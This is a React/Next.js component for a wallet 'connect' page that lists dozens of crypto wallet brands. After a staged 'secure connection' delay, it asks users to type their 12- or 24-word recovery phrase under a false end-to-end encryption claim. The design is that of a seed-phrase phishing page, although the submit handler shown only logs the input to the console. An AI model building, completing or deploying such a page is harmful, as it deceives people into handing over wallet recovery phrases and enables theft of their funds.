'use client'

import { useState, useEffect } from "react"
import Image from "next/image"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Input } from "@/components/ui/input"
import { InfinitySpin } from "react-loader-spinner"
import CryptoWidget from "./NavbarWidget"

interface Wallet {
    name: string
    url: string
    image: string
    className: string
  }

  const wallets: Wallet[] = [
    { name: "MetaMask", url: "https://metamask.io", image: "/metamask.jpg", className: "" },
    { name: "Coinbase", url: "https://coinbase.com", image: "/coinbase.png", className: "rounded-full" },
    { name: "Trust Wallet", url: "https://trustwallet.com", image: "/trust_wallet.jpg", className: "" },
    { name: "Phantom", url: "https://phantom.app", image: "/phantom.png", className: "" },
    { name: "Ledger", url: "https://ledger.io", image: "/ledger.png", className: "rounded-full" },
    { name: "SafePal", url: "https://safepal.io", image: "/safepal.png", className: "rounded-full" },
    { name: "Wallet Connect", url: "https://myetherwallet.com", image: "/walle.jpg", className: "" },
    { name: "Bitget", url: "https://exodus.com", image: "/bitget.png", className: "" },
    { name: "Rabby", url: "https://atomicwallet.io", image: "/rabby.png", className: "rounded-full" },
    { name: "Pera", url: "https://perawallet.app", image: "/pera.png", className: "rounded-full" },
    { name: "Tonkeeper", url: "https://tonkeeper.com", image: "/tonke.webp", className: "rounded-full" },
    { name: "Binance Chain Wallet", url: "https://binance.com", image: "/binance.png", className: "rounded-full" },
    { name: "Bitpay", url: "https://atomicwallet.io", image: "/bitpay.jpg", className: "rounded-full" },
    { name: "Polygon Wallet", url: "https://atomicwallet.io", image: "/polygon.jpg", className: "rounded-full" },
    { name: "Walleth", url: "https://atomicwallet.io", image: "/walleth.jpg", className: "rounded-full" },
    { name: "Argent", url: "https://atomicwallet.io", image: "/argent.jpg", className: "rounded-full" },
    { name: "Polkadot", url: "https://polkadot.network", image: "/polkadot.jpg", className: "rounded-full" },
    { name: "Compound", url: "https://compound.finance", image: "/compound.jpg", className: "rounded-full" },
    { name: "KasWare wallet", url: "https://kasware.xyz", image: "/kasware.png", className: "rounded-full" },
    { name: "Tronlink", url: "https://tronlink.org", image: "/tronlink.jpg", className: "rounded-full" },
    { name: "Core", url: "https://core.app", image: "/core.png", className: "rounded-full" },
    { name: "Midas Wallet", url: "https://midasprotocol.io", image: "/midas.jpg", className: "rounded-full" },
    { name: "Talken Wallet", url: "https://talken.io", image: "/talken.jpg", className: "rounded-full" },
    { name: "O3Wallet", url: "https://o3.network", image: "/o3.jpg", className: "rounded-full" },
    { name: "KEYRING PRO", url: "https://keyring.app", image: "/keyring.jpg", className: "rounded-full" },
    { name: "HashKey Me", url: "https://hashkey.com", image: "/hashkey.jpg", className: "rounded-full" },
    { name: "AToken Wallet", url: "https://atoken.com", image: "/atoken.jpg", className: "rounded-full" },
    { name: "Flare Wallet", url: "https://flarewallet.io", image: "/flare.jpg", className: "rounded-full" },
    { name: "RWallet", url: "https://rsk.co", image: "/rwallet.jpg", className: "rounded-full" },
    { name: "Jade Wallet", url: "https://jadewallet.io", image: "/jade.jpg", className: "rounded-full" },
    { name: "Maiar Wallet", url: "https://Maiar.com", image: "/maiarwallet.png", className: "rounded-full" },
    { name: "Guarda Wallet", url: "https://guarda.com", image: "/guarda.jpg", className: "rounded-full" },
    { name: "Cello Wallet", url: "https://cellowallet.app", image: "/cello.jpg", className: "rounded-full" },
    { name: "CoinUs", url: "https://coinus.io", image: "/coinus.jpg", className: "rounded-full" },
    { name: "Valora", url: "https://valoraapp.com", image: "/valora.jpg", className: "rounded-full" },
    { name: "Trustee Wallet", url: "https://trusteeglobal.com", image: "/trustee.jpg", className: "rounded-full" },
    { name: "Dok Wallet", url: "https://dokwallet.com", image: "/dok.jpg", className: "rounded-full" },
    { name: "HaloDefi Wallet", url: "https://halodefi.org", image: "/halo.jpg", className: "rounded-full" },
    { name: "Unstoppable Wallet", url: "https://unstoppabble.money", image: "/kyberswap.jpg", className: "rounded-full" },
    { name: "BitKeep", url: "https://bitkeep.com", image: "/bitkeep.jpg", className: "rounded-full" },
    { name: "Ownbit", url: "https://ownbit.io", image: "/ownbit.jpg", className: "rounded-full" },
    { name: "Tokenary", url: "https://tokenary.io", image: "/tokenary.jpg", className: "rounded-full" },
    { name: "Easy Pocket", url: "https://easypocket.app", image: "/easypocket.jpg", className: "rounded-full" },
    { name: "Via Wallet", url: "https://viawallet.com", image: "/viawallet.jpg", className: "rounded-full" },
    { name: "Bridge Wallet", url: "https://mtpelerin.com", image: "/bridgewallet.jpg", className: "rounded-full" },
    { name: "Wallet.io", url: "https://wallet.io", image: "/walletio.jpg", className: "rounded-full" },
    { name: "Infinito", url: "https://infinitowallet.io", image: "/infinito.jpg", className: "rounded-full" },
    { name: "Coinomi", url: "https://coinomi.com", image: "/coinomi.jpg", className: "rounded-full" },
    { name: "Nash", url: "https://nash.io", image: "/nash.jpg", className: "rounded-full" },
    { name: "GridPlus", url: "https://gridplus.io", image: "/gridplus.jpg", className: "rounded-full" },
    { name: "Atomic", url: "https://atomicwallet.io", image: "/atomic.jpg", className: "rounded-full" },
    { name: "Trust Vault", url: "https://trustology.io", image: "/trustvault.jpg", className: "rounded-full" },
    { name: "CoolWallet S", url: "https://coolwallet.io", image: "/coolwallets.jpg", className: "rounded-full" },
    { name: "MYKEY", url: "https://mykey.org", image: "/mykey.jpg", className: "rounded-full" },
    { name: "Dharma", url: "https://dharma.io", image: "/dharma.jpg", className: "rounded-full" },
    { name: "Crypto.com", url: "https://crypto.com", image: "/crypto.jpg", className: "rounded-full" },
    { name: "Math Wallet", url: "https://mathwallet.org", image: "/mathwallet.jpg", className: "rounded-full" },
    { name: "Token Pocket", url: "https://tokenpocket.pro", image: "/tokenpocket.jpg", className: "rounded-full" },
    { name: "1inch", url: "https://1inch.io", image: "/1inch.jpg", className: "rounded-full" },
    { name: "Iotex", url: "https://iotex.io", image: "/iotex.jpg", className: "rounded-full" },
    { name: "Coin98", url: "https://coin98.com", image: "/coin98.jpg", className: "rounded-full" },
    { name: "Encrypted Ink", url: "https://encrypted.ink", image: "/encryptedink.jpg", className: "rounded-full" },
    { name: "Huobi Wallet", url: "https://huobiwallet.com", image: "/huobi.jpg", className: "rounded-full" },
    { name: "Solflare Wallet", url: "https://solflare.com", image: "/solflare.png", className: "rounded-full" },
    { name: "Blade", url: "https://bladewallet.io", image: "/blade.png", className: "rounded-full" },
    { name: "Rainbow", url: "https://rainbow.me", image: "/rainbow.jpg", className: "rounded-full" },
    { name: "Klever", url: "https://hashpack.app", image: "/klev.png", className: "rounded-full" },
    { name: "Keplr", url: "https://keplr.app", image: "/keplr.png", className: "rounded-full" },
    { name: "Exodus", url: "https://exodus.com", image: "/exodus.png", className: "rounded-full" },
    { name: "Electrum", url: "https://electrum.org", image: "/electrum.png", className: "rounded-full" },
    { name: "Suiet", url: "https://suiet.app", image: "/sui.jpg", className: "rounded-full" },
    { name: "Subwallet", url: "https://subwallet.app", image: "/subwallet.jpeg", className: "rounded-full" },
    { name: "Eternl", url: "https://eternl.io", image: "/eternl.png", className: "rounded-full" },
    { name: "Near", url: "https://wallet.near.org", image: "/near.png", className: "rounded-full" },
    { name: "Xaman", url: "https://xumm.app", image: "/xaman.jpg", className: "rounded-full" },
    { name: "Thorwallet", url: "https://Thorwallet.org", image: "/thor.png", className: "rounded-full" },
    { name: "Bluewallet", url: "https://Bluewallet.io", image: "/blue.png", className: "rounded-full" },
    { name: "Chainge", url: "https://chainge.finance", image: "/chainge.jpg", className: "rounded-full" },
    { name: "NGRAVE", url: "https://ngrave.io", image: "/ngrave.png", className: "rounded-full" },
    { name: "imToken", url: "https://token.im", image: "/imtoken.jpg", className: "rounded-full" },
    { name: "Others", url: "https://others.com", image: "/imtoken.jpg", className: "rounded-full" }
  ]

  export default function Component() {
    const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null)
    const [isLoading, setIsLoading] = useState<boolean>(false)
    const [isDialogOpen, setIsDialogOpen] = useState<boolean>(false)
    const [walletAddress, setWalletAddress] = useState<string>("")
    const [showManualForm, setShowManualForm] = useState<boolean>(false)
  
    useEffect(() => {
      if (selectedWallet && isDialogOpen) {
        setIsLoading(true)
        const timer = setTimeout(() => {
          setIsLoading(false)
        }, 5000)
        return () => clearTimeout(timer)
      }
    }, [selectedWallet, isDialogOpen])
  
    const handleWalletClick = (wallet: Wallet) => {
      setSelectedWallet(wallet)
      setIsDialogOpen(true)
      setShowManualForm(false)
    }
  
    const handleCloseDialog = () => {
      setIsDialogOpen(false)
      setSelectedWallet(null)
      setIsLoading(false)
      setWalletAddress("")
      setShowManualForm(false)
    }
  
    const handleConnectWallet = (e: React.FormEvent) => {
      e.preventDefault()
      console.log(`Connecting to ${selectedWallet?.name} with address: ${walletAddress}`)
      // Implement your wallet connection logic here
    }
  
    const handleManualConnect = () => {
      setShowManualForm(true)
    }
  
    return (
      <div className="min-h-screen bg-gray-100">
        <CryptoWidget />
        <main className="container mx-auto px-4 py-8">
          <section className="mb-12 text-center">
            <h1 className="text-4xl font-bold text-gray-900 mb-4">Select a Wallet</h1>
            <div className="flex justify-center">
              <InfinitySpin width="200" color="#4082cc" />
            </div>
          </section>
  
          <section className="grid grid-cols-2 md:grid-cols-4 gap-6">
            {wallets.map((wallet, index) => (
              <div
                key={index}
                className="bg-white rounded-lg shadow-md hover:shadow-lg transition-shadow duration-300 overflow-hidden cursor-pointer"
                onClick={() => handleWalletClick(wallet)}
              >
                <div className="p-3 flex flex-col items-center">
                  <Image
                    src={wallet.image}
                    alt={`${wallet.name} logo`}
                    width={60}
                    height={60}
                    className={`mb-4 ${wallet.className}`}
                  />
                  <h2 className="text-lg font-semibold text-gray-900 text-center">{wallet.name}</h2>
                  <p className="text-sm text-gray-500 mt-2 text-center">{new URL(wallet.url).hostname}</p>
                </div>
              </div>
            ))}
          </section>
        </main>
  
        <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
          <DialogContent className="sm:max-w-md bg-white">
            <DialogHeader>
              <DialogTitle className="text-center">{selectedWallet?.name}</DialogTitle>
              <DialogDescription className="text-center">
                Connect to your {selectedWallet?.name} wallet
              </DialogDescription>
            </DialogHeader>
            <button
              onClick={handleCloseDialog}
              className="absolute top-4 right-4 text-gray-500 hover:text-gray-700"
              aria-label="Close dialog"
            >
            </button>
            {selectedWallet && (
              <div className="flex flex-col items-center py-4">
                <Image
                  src={selectedWallet.image}
                  alt={`${selectedWallet.name} logo`}
                  width={100}
                  height={100}
                  className={`mb-2 ${selectedWallet.className}`}
                />
                {isLoading ? (
                  <div className="mb-4">
                    <div className="flex justify-center">
                      <InfinitySpin width="200" color="#4082cc" />
                    </div>
                    <p className="font-bold text-lg mb-0.5 text-center">starting secure connection</p>
                    <p className="text-gray-600 text-center">please wait...</p>
                  </div>
                ) : showManualForm ? (
                  <form onSubmit={handleConnectWallet} className="w-full space-y-4">
                    <Input
                      type="text"
                      placeholder="Enter your 12 or 24 Memonic words."
                      value={walletAddress}
                      onChange={(e) => setWalletAddress(e.target.value)}
                      className="w-full pb-32 pt-4 text-md font-thin"
                      required
                    />
                    <button type="submit" className="w-full bg-[#5143fb] py-2 rounded-full hover:bg-[#4082cc] text-white">
                      Connect Wallet
                    </button>
                  </form>
                ) : (
                  <div className="w-full space-y-4">
                    <button 
                      onClick={() => setIsLoading(true)} 
                      className="w-full border py-1.5 rounded-full text-[#4082cc] bg-white border-[#4082cc] hover:bg-gray-100"
                    >
                      Try Again
                    </button>
                    <button 
                      onClick={handleManualConnect}
                      className="w-full border border-white py-1.5 text-white rounded-full bg-[#5143fb] hover:bg-[#4082cc]"
                    >
                      Connect Manually
                    </button>
                  </div>
                )}
              </div>
            )}
            <div className="mt-8">
              <div className="flex justify-center gap-1">
                <Image src={"/shield.png"} width={30} height={30} alt="" />
                <p className="flex justify-center gap-2 max-w-[400px] font-semibold text-gray-600">This session is protected with an end-to-end</p>
              </div>
              <p className="text-center font-semibold text-gray-600">encryption</p>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    )
  }